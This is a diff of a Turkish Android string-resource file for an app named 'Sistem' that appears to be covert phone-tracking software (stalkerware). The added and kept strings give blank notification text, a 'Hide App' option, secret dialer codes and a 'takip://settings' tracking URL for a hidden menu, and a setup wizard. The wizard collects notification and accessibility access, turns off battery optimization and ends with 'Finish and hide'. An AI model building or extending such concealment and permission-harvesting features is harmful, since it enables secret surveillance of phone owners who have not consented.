@@ -1,18 +1,31 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">Sistem</string>
-    <string name="setup_title">Kurulum</string>
-    <string name="setup_subtitle">Panel adresinizi ve hesabınızı girin</string>
-    <string name="panel_url">Panel Adresi</string>
+    <string name="setup_title">Hızlı Kurulum</string>
+    <string name="setup_subtitle">Sadece e-posta ve şifrenizi girin — geri kalan otomatik</string>
+    <string name="device_auto_label">Cihaz (otomatik)</string>
+    <string name="server_auto_label">Sunucu (otomatik)</string>
     <string name="email">E-posta</string>
     <string name="password">Şifre</string>
-    <string name="device_name">Cihaz Adı</string>
-    <string name="connect">Bağlan ve Kur</string>
+    <string name="connect">Başla</string>
     <string name="service_notification_title"> </string>
     <string name="service_notification_text"> </string>
     <string name="hidden_settings_title">Sistem Ayarları</string>
     <string name="hide_app">Uygulamayı Gizle</string>
     <string name="accessibility_description">Sistem erişilebilirlik servisi</string>
     <string name="show_status">Durum</string>
-    <string name="secret_code_hint">Gizli menü: *#*#5555555555#*#* veya *#*#82547#*#* veya tarayıcıda takip://settings</string>
+    <string name="secret_code_hint">Gizli menü: *#*#82547#*#* veya *#*#8255#*#* veya tarayıcı: takip://settings</string>
+    <string name="wizard_title">İzin Kurulumu</string>
+    <string name="wizard_progress">%1$d / %2$d tamamlandı</string>
+    <string name="wizard_runtime">Uygulama izinleri isteniyor…</string>
+    <string name="wizard_notification">Bildirim erişimini açın</string>
+    <string name="wizard_accessibility">Erişilebilirlik servisini açın</string>
+    <string name="wizard_battery">Pil optimizasyonunu kapatın</string>
+    <string name="wizard_all_done">Tüm izinler tamam!</string>
+    <string name="wizard_step_runtime">Uygulama izinleri</string>
+    <string name="wizard_step_notification">Bildirim erişimi</string>
+    <string name="wizard_step_accessibility">Erişilebilirlik</string>
+    <string name="wizard_step_battery">Pil optimizasyonu</string>
+    <string name="wizard_manual">Sonraki izne geç</string>
+    <string name="wizard_finish">Bitir ve gizle</string>
 </resources>
